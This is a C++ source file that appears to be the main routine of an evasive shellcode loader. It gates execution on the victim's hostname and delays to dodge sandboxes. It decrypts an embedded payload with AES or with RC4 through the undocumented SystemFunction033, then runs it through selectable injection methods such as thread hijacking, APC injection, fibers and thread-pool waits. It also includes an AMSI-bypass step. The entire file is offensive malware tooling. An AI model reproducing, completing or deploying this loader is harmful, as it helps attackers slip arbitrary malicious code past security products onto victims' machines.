#include "Cloak.hpp"
#include "Payload.hpp"

int main() {

    #ifdef CHECK_HOSTNAME
    if ( ! CheckHostname( HOSTNAME ) ) {
        #ifdef DEBUG
        printf( "[-] Hostnames do not match\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !CHECK_HOSTNAME

    Sleep( DELAY * 1000 );

    PBYTE* pbPayload = NULL;

    #ifdef AES
    struct AES_ctx ctx;

    AES_init_ctx_iv( &ctx, Key, IV );
    AES_CBC_decrypt_buffer( &ctx, Payload, sizeof( Payload ) );
    #endif // !AES

    #ifdef RC4
    USTRING uKey    = {};
    uKey.Buffer     = Key;
    uKey.Length     = sizeof( Key );
    uKey.MaxLength  = sizeof( Key );

    USTRING uPayload    = {};
    uPayload.Buffer     = Payload;
    uPayload.Length     = sizeof( Payload );
    uPayload.MaxLength  = sizeof( Payload );

    fnSystemFunction033 SystemFunc33 = ( fnSystemFunction033 ) GetProcAddress( LoadLibraryA( "Advapi32" ), "SystemFunction033" );
    
    SystemFunc33(&uPayload, &uKey);

    pbPayload = ( PBYTE* ) uPayload.Buffer;
    #endif // !RC4

    if ( pbPayload == NULL ) {
        pbPayload = ( PBYTE* ) &Payload;
    }

    #ifdef LOCAL_THREAD
    if ( ! LocalThreadInject( pbPayload, sizeof( Payload ) ) ) {
        #ifdef DEBUG
        printf( "[-] Failed to Execute Payload\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !LOCAL_THREAD

    #ifdef LOCAL_THREAD_HIJACK
    if ( ! LocalThreadHijack( pbPayload, sizeof( Payload ) ) ) {
        #ifdef DEBUG
        printf( "[-] Failed to Execute Payload\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !LOCAL_THREAD_HIJACK

    #ifdef LOCAL_THREAD_HIJACK_ENUM
    if ( ! LocalThreadHijack( pbPayload, sizeof( Payload ) ) ) {
        #ifdef DEBUG
        printf( "[-] Failed to Execute Payload\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !LOCAL_THREAD_HIJACK_ENUM

    #ifdef APC
    if ( ! ApcInjection( pbPayload, sizeof( Payload ) ) ) {
        #ifdef DEBUG
        printf( "[-] Failed to Execute Payload\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !APC

    #ifdef FIBERS
    if ( ! FiberExec( pbPayload, sizeof( Payload ) ) ) {
        #ifdef DEBUG
        printf( "[-] Failed to Execute Payload\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !FIBERS

    #ifdef THREADPOOLWAIT
    if ( ! ThreadPoolWait( pbPayload, sizeof( Payload ) ) ) {
        #ifdef DEBUG
        printf( "[-] Failed to Execute Payload\n");
        #endif // !DEBUG
        
        return 1;
    }
    #endif // !THREADPOOLWAIT

    #ifdef BYPASS_AMSI
    CleapUpHardwareBreakpointHooking();
    #endif // !BYPASS_AMSI

    return 0;

}